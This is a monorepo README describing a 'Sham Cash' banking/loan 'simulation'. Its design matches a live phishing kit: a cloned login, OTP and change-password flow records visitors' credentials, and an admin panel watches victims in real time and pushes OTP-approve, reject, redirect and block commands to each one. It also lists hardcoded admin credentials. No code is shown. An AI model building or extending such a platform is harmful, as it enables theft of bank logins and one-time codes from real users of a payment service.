# Workspace

## Overview

pnpm workspace monorepo using TypeScript. Contains two user-facing apps and a shared API server for the **Sham Cash** banking/loan simulation platform.

## Stack

- **Monorepo tool**: pnpm workspaces
- **Node.js version**: 24
- **Package manager**: pnpm
- **TypeScript version**: 5.9
- **API framework**: Express 5
- **Database**: PostgreSQL (raw `pg` client, no Drizzle on sham routes)
- **Validation**: Zod (`zod/v4`), `drizzle-zod`
- **Build**: esbuild (CJS bundle)

## Artifacts

### sham-cash (`artifacts/sham-cash`)
- User-facing banking/loan app
- Routes: `/` (login), `/otp`, `/changepass`, `/blocked`
- Supports Arabic/English toggle (`useLang` hook)
- Calls API via Vite proxy `/api` → `localhost:8080`
- Key hooks: `useVisitorTracking`, `useAdminCommands`

### sham-admin (`artifacts/sham-admin`)
- Admin dashboard at `/admin-panel/`
- Arabic-only, shows all visitor submissions from PostgreSQL
- Polls API every 2s for live status (heartbeat-based `isActive`)
- Can send redirect/OTP/password commands to specific visitors
- Admin credentials: `admin@shamcash.com` / `admin1234`
- Calls API via Vite proxy `/api` → `localhost:8080`

### api-server (`artifacts/api-server`)
- Express 5 API on port 8080
- Routes mounted at `/api/sham/`:
  - `POST /submissions` — create/upsert visitor
  - `GET /submissions` — list all (admin)
  - `PATCH /submissions/:id` — update fields
  - `DELETE /submissions/:id` — delete one
  - `DELETE /submissions` — delete all
  - `POST /heartbeat` — update lastSeen + isActive
  - `POST /cmd` — send command to visitor
  - `GET /cmd/:visitorId` — consume command (one-shot, deleted on read)

## Database Tables

### `sham_submissions`
Stores visitor login data + OTP/password status. `is_active` + `last_seen` used for live detection (< 8s = active).

### `sham_admin_cmds`
One-shot command queue. Commands consumed and deleted on first read. Commands: `redirect:login|otp|changepass|blocked`, `otp:approved|rejected`, `changepass:approved|rejected`.

## Key Commands

- `pnpm run typecheck` — full typecheck across all packages
- `pnpm run build` — typecheck + build all packages
- `pnpm --filter @workspace/api-server run dev` — run API server locally (needs PORT=8080)

See the `pnpm-workspace` skill for workspace structure, TypeScript setup, and package details.
